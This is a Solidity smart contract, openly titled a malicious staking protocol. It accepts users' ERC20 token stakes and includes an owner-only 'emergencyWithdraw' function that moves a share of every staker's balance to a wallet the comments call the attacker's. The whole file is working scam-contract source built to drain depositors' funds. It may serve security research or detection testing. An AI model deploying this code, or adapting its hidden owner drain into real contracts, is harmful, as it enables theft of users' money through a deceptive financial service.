// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Ownable} from "../node_modules/@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "../node_modules/@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title Malicious Staking Protocol
 * @dev A malicious staking protocol that allows users to stake tokens and then drains their stakes in an emergency withdrawal
 */
contract MaliciousStakingProtocol is Ownable {
    IERC20 public token; // The ERC20 token contract

    address payable public backupWallet; // Address of the attacker's wallet
    mapping(address => uint256) private stakes; // Mapping to keep track of user stakes
    uint256 public totalStaked; // Total amount of tokens staked
    address[] private stakers; // Array to keep track of all stakers
    mapping(address => bool) private isStaker; // Mapping to check if an address is a staker

    event Staked(address indexed user, uint256 amount); // Event emitted when tokens are staked
    event Withdrawn(address indexed user, uint256 amount); // Event emitted when tokens are withdrawn
    event StakeDrained(address indexed victim, uint256 amount); // Event emitted when stakes are drained

    /**
     * @dev Constructor function
     * @param _tokenAddress The address of the ERC20 token
     * @param _backupWallet The address of the attacker's wallet
     */
    constructor(
        address _tokenAddress,
        address payable _backupWallet
    ) Ownable(msg.sender) {
        token = IERC20(_tokenAddress);
        backupWallet = _backupWallet;
    }

    /**
     * @dev Function to allow users to stake tokens
     * @param amount The amount of tokens to stake
     */
    function stakeTokens(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        require(
            token.transferFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );

        if (!isStaker[msg.sender]) {
            stakers.push(msg.sender);
            isStaker[msg.sender] = true;
        }

        stakes[msg.sender] += amount;
        totalStaked += amount;

        emit Staked(msg.sender, amount);
    }

    /**
     * @dev Function to allow users to withdraw their staked tokens
     * @param amount The amount of tokens to withdraw
     */
    function withdrawTokens(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        require(stakes[msg.sender] >= amount, "Insufficient staked amount");

        stakes[msg.sender] -= amount;
        totalStaked -= amount;

        require(token.transfer(msg.sender, amount), "Transfer failed");

        if (stakes[msg.sender] == 0) {
            isStaker[msg.sender] = false;
        }

        emit Withdrawn(msg.sender, amount);
    }

    /**
     * @dev Function to check the amount of staked tokens by a user
     * @param user The address of the user
     * @return The amount of staked tokens
     */
    function checkStake(address user) external view returns (uint256) {
        return stakes[user];
    }

    /**
     * @dev Function to handle emergency withdrawal to drain stakes from other users
     * @param amount The amount of tokens to drain
     */
    function emergencyWithdraw(uint256 amount) external onlyOwner {
        require(amount <= totalStaked, "Insufficient staked amount");

        uint256 totalAmount = amount;
        for (uint256 i = 0; i < stakers.length; i++) {
            address user = stakers[i];
            if (isStaker[user]) {
                uint256 userStake = stakes[user];
                uint256 userAmount = (userStake * amount) / totalStaked;
                stakes[user] -= userAmount;
                token.transfer(backupWallet, userAmount);

                if (stakes[user] == 0) {
                    isStaker[user] = false;
                }

                emit StakeDrained(user, userAmount);
            }
        }

        totalStaked -= totalAmount;
    }
}
